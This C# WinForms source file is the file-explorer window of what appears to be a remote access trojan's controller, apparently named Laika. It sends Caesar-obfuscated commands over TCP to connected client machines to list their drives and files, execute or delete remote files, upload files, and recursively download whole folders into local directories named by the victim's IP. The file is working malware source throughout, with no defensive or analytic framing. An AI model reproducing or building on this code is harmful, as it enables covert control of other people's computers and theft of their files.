using System;
using System.IO;
using System.Threading;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;
using System.Runtime.InteropServices.ComTypes;

namespace Server
{
    public partial class FileExplorer : Form
    {
        public FileExplorer()
        {
            InitializeComponent();
        }

        public static int ITEM_ID = 0;
        public static int CLIENT_ID = 0;
        public static string PATH = "";
        public static bool OPENED = false;

        private void GetFileList()
        {
            dataGridView2.Rows.Clear();
            CLIENT_ID = Server.Menu.CLIENT_ID;
            if (Server.Menu.CONNECT_CLIENTS.Count <= CLIENT_ID)
                return;
            TcpClient c = Server.Menu.CONNECT_CLIENTS[CLIENT_ID];
            c.ReceiveTimeout = 10000;
            c.Client.Blocking = true;

            string receivedData = "";
            try
            {
                NetworkStream stream = c.GetStream();

                byte[] Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR("get_file_list"));
                stream.Write(Message, 0, Message.Length);

                Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR(PATH));
                stream.Write(Message, 0, Message.Length);

                byte[] buffer = new byte[256 * 4096];
                int bytesRead;
                bytesRead = stream.Read(buffer, 0, buffer.Length);
                receivedData = System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead);
                if (receivedData == "")
                    return;
                receivedData = Utils.CAESAR_DECRYPT(receivedData);
                string[] files = receivedData.Split('/');
                int idx = dataGridView2.Rows.Add("");
                dataGridView2.Rows[idx].Tag = "../.";
                foreach (string f in files)
                {
                    Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR("get_obj_info"));
                    stream.Write(Message, 0, Message.Length);

                    Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR(PATH + f));
                    stream.Write(Message, 0, Message.Length);

                    buffer = new byte[1];
                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                    receivedData = System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    if (receivedData == "")
                        return;

                    idx = dataGridView2.Rows.Add("");
                    dataGridView2.Rows[idx].Tag = f;
                    if (receivedData == "d")
                    {
                        dataGridView2.Rows[idx].Tag += "/d";
                    }
                    else
                    {
                        dataGridView2.Rows[idx].Tag += "/f";
                    }
                }

                c.Client.Blocking = false;
            } catch
            {
                CLIENT_ID = -1;
                return;
            }
            
            dataGridView2.ClearSelection();
            dataGridView2.Update();
        }
        private void FileExplorer_Load(object sender, EventArgs e)
        {
            OPENED = true;
            CLIENT_ID = Server.Menu.CLIENT_ID;
            TcpClient c = Server.Menu.CONNECT_CLIENTS[CLIENT_ID];
            c.ReceiveTimeout = 10000;
            c.Client.Blocking = true;

            string receivedData = "";
            try
            {
                NetworkStream stream = c.GetStream();

                byte[] Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR("get_drives"));
                stream.Write(Message, 0, Message.Length);

                byte[] buffer = new byte[256];
                int bytesRead;
                bytesRead = stream.Read(buffer, 0, buffer.Length);
                receivedData = System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead);
                c.Client.Blocking = false;
            } catch
            {
                CLIENT_ID = -1;
                OPENED = false;
                return;
            }
            foreach (char l in receivedData)
            {
                comboBox1.Items.Add(l);
            }
            comboBox1.SelectedIndex = 0;
            PATH = comboBox1.Text + ":/";
            textBox1.Text = PATH;

            dataGridView2.ClearSelection();

            GetFileList();
        }

        private void dataGridView2_CellMouseClick(object sender, DataGridViewCellMouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right && e.RowIndex >= 0 && e.ColumnIndex >= 0)
            {
                dataGridView2.CurrentCell = dataGridView2.Rows[e.RowIndex].Cells[e.ColumnIndex];
                ITEM_ID = dataGridView2.CurrentRow.Index;

                contextMenuStrip1.Show(Cursor.Position);
            }
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            PATH = comboBox1.Text + ":/";
            textBox1.Text = PATH;
            GetFileList();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            GetFileList();
        }

        private void dataGridView2_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
        {
            string file = dataGridView2.SelectedRows[0].Tag.ToString().Split('/').First();
            string type = dataGridView2.SelectedRows[0].Tag.ToString().Split('/').Last();

            if (file == ".." && PATH.Length != 3)
            {
                PATH = PATH.Remove(PATH.LastIndexOf('/', PATH.Length - 2) + 1);
            }
            else if (type != "d")
                return;
            else if (file != "..")
            {
                PATH += file + "/";
            }
            textBox1.Text = PATH;
            GetFileList();
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string file = dataGridView2.SelectedRows[0].Tag.ToString().Split('/').First();

            try
            {
                CLIENT_ID = Server.Menu.CLIENT_ID;
                if (Server.Menu.CONNECT_CLIENTS.Count <= CLIENT_ID)
                    return;
                TcpClient c = Server.Menu.CONNECT_CLIENTS[CLIENT_ID];
                c.ReceiveTimeout = 10000;
                c.Client.Blocking = true;
                NetworkStream stream = c.GetStream();

                byte[] Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR("execute"));
                stream.Write(Message, 0, Message.Length);
                Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR(PATH + file));
                stream.Write(Message, 0, Message.Length);

                c.Client.Blocking = false;
            }
            catch
            {
                CLIENT_ID = -1;
                OPENED = false;
                return;
            }
        }

        private void dataGridView2_CellPainting(object sender, DataGridViewCellPaintingEventArgs e)
        {
            if (e.ColumnIndex == 0 && e.RowIndex >= 0)
            {
                e.Paint(e.CellBounds, DataGridViewPaintParts.All);

                string tmp = dataGridView2.Rows[e.RowIndex].Tag?.ToString();
                if (tmp == null)
                    return;
                string type = tmp.Split('/').Last();
                var isDirectory = type == "d";
                var icon = isDirectory ? Properties.Resources.folder : Properties.Resources.file;
                if (type == ".")
                    icon = Properties.Resources.up_arrow;

                int iconWidth = 16;
                int iconHeight = 16;
                int iconX = e.CellBounds.Left + 3;
                int iconY = e.CellBounds.Top + (e.CellBounds.Height - iconHeight) / 2;
                e.Graphics.DrawImage(icon, new Rectangle(iconX, iconY, iconWidth, iconHeight));

                var text = tmp.Split('/').First();
                var textX = iconX + iconWidth + 5;
                var textY = e.CellBounds.Top + (e.CellBounds.Height - e.CellStyle.Font.Height) / 2;
                e.Graphics.DrawString(text, e.CellStyle.Font, Brushes.Black, textX, textY);

                e.Handled = true;
            }
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.SuppressKeyPress = true; // Prevent the beep sound on Enter key
                PATH = textBox1.Text;
                if (PATH.Last() != '/')
                    PATH += '/';
                textBox1.Text = PATH;
                textBox1.SelectionStart = textBox1.TextLength;
                GetFileList();
                e.Handled = true;
            }
        }

        private void contextMenuStrip1_Opening(object sender, CancelEventArgs e)
        {
            string type = dataGridView2.SelectedRows[0].Tag.ToString().Split('/').Last();

            executeToolStripMenuItem.Visible = type != "d";
        }

        private void FileExplorer_FormClosing(object sender, FormClosingEventArgs e)
        {
            OPENED = false;
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string file = dataGridView2.SelectedRows[0].Tag.ToString().Split('/').First();
            string type = dataGridView2.SelectedRows[0].Tag.ToString().Split('/').Last();

            try
            {
                CLIENT_ID = Server.Menu.CLIENT_ID;
                if (Server.Menu.CONNECT_CLIENTS.Count <= CLIENT_ID)
                    return;
                TcpClient c = Server.Menu.CONNECT_CLIENTS[CLIENT_ID];
                c.ReceiveTimeout = 10000;
                c.Client.Blocking = true;
                NetworkStream stream = c.GetStream();

                byte[] Message = new byte[20];
                if (type == "d")
                {
                    Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR("del_dir"));
                } else
                {
                    Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR("del_file"));
                }
                stream.Write(Message, 0, Message.Length);
                Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR(PATH + file));
                stream.Write(Message, 0, Message.Length);

                c.Client.Blocking = false;
            }
            catch
            {
                CLIENT_ID = -1;
                OPENED = false;
                return;
            }
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Title = "Select your file"
            };

            if (openFileDialog.ShowDialog() != DialogResult.OK)
                return;

            string filePath = openFileDialog.FileName;
            string fileNameWithExtension = Path.GetFileName(filePath);

            try
            {
                CLIENT_ID = Server.Menu.CLIENT_ID;
                if (Server.Menu.CONNECT_CLIENTS.Count <= CLIENT_ID)
                    return;
                TcpClient c = Server.Menu.CONNECT_CLIENTS[CLIENT_ID];
                c.ReceiveTimeout = 10000;
                c.Client.Blocking = true;
                NetworkStream stream = c.GetStream();

                byte[] Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR("upload_file"));
                stream.Write(Message, 0, Message.Length);
                Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR(PATH + fileNameWithExtension));
                stream.Write(Message, 0, Message.Length);
                byte[] fileContent = File.ReadAllBytes(filePath);
                stream.Write(fileContent, 0, fileContent.Length);

                c.Client.Blocking = false;
            }
            catch
            {
                CLIENT_ID = -1;
                OPENED = false;
                return;
            }
        }

        private void DownloadFile(string file, NetworkStream stream, TcpClient c)
        {
            Thread.Sleep(100);
            Shell.ClearSocketData(c);

            byte[] Message = new byte[4096];
            Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR("download_file"));
            stream.Write(Message, 0, Message.Length);
            string foldername = c.Client.RemoteEndPoint.ToString().Split(':')[0];
            if (!Directory.Exists(foldername))
                Directory.CreateDirectory(foldername);

            Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR(file));
            stream.Write(Message, 0, Message.Length);

            byte[] delimiter = Encoding.UTF8.GetBytes("<Laika:EOF>");
            int delimiterLength = delimiter.Length;
            List<byte> receivedBytes = new List<byte>();
            byte[] buffer = new byte[4096];
            int bytesRead;

            using (FileStream fileStream = new FileStream(foldername + "/" + file.Replace(PATH, ""), FileMode.Create, FileAccess.Write))
            {
                while (true)
                {
                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                    if (bytesRead == 0)
                    {
                        break;
                    }
                    receivedBytes.AddRange(buffer.Take(bytesRead));

                    while (receivedBytes.Count >= delimiterLength)
                    {
                        int endIndex = receivedBytes.Count - delimiterLength;
                        if (receivedBytes.Skip(endIndex).Take(delimiterLength).SequenceEqual(delimiter))
                        {
                            fileStream.Write(receivedBytes.ToArray(), 0, endIndex);
                            return;
                        }
                        else
                        {
                            fileStream.WriteByte(receivedBytes[0]);
                            receivedBytes.RemoveAt(0);
                        }
                    }
                }
                if (receivedBytes.Count > 0)
                {
                    fileStream.Write(receivedBytes.ToArray(), 0, receivedBytes.Count);
                }
            }
        }
        
        private void DownloadFolder(string folder, string path, NetworkStream stream, TcpClient c)
        {
            if (!Directory.Exists(path))
                Directory.CreateDirectory(path);

            byte[] Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR("get_file_list"));
            stream.Write(Message, 0, Message.Length);
            Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR(folder + "/"));
            stream.Write(Message, 0, Message.Length);
            byte[] buffer = new byte[256 * 4096];
            int bytesRead;
            bytesRead = stream.Read(buffer, 0, buffer.Length);
            string receivedData = System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead);
            if (receivedData == "")
                return;
            receivedData = Utils.CAESAR_DECRYPT(receivedData);
            foreach (string e in receivedData.Split('/'))
            {
                Thread.Sleep(100);
                Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR("get_obj_info"));
                stream.Write(Message, 0, Message.Length);
                Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR(folder + "/" + e));
                stream.Write(Message, 0, Message.Length);
                bytesRead = stream.Read(buffer, 0, buffer.Length);
                string infos = System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead);
                if (infos.Split('/')[0] == "f")
                {
                    DownloadFile(folder + "/" + e, stream, c);
                    continue;
                } else
                {
                    DownloadFolder(folder + "/" + e, path + "/" + e, stream, c);
                }
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string file = dataGridView2.SelectedRows[0].Tag.ToString().Split('/').First();
            string type = dataGridView2.SelectedRows[0].Tag.ToString().Split('/').Last();

            try
            {
                CLIENT_ID = Server.Menu.CLIENT_ID;
                if (Server.Menu.CONNECT_CLIENTS.Count <= CLIENT_ID)
                    return;
                TcpClient c = Server.Menu.CONNECT_CLIENTS[CLIENT_ID];
                c.ReceiveTimeout = 10000;
                c.Client.Blocking = true;
                NetworkStream stream = c.GetStream();
                
                if (type == "d")
                {
                    string foldername = c.Client.RemoteEndPoint.ToString().Split(':')[0];
                    if (!Directory.Exists(foldername))
                        Directory.CreateDirectory(foldername);
                    DownloadFolder(PATH + file, foldername + "/" + file, stream, c);
                }
                else
                {
                    DownloadFile(PATH + file, stream, c);
                }

                c.Client.Blocking = false;
            }
            catch
            {
                CLIENT_ID = -1;
                OPENED = false;
                return;
            }
        }
    }
}
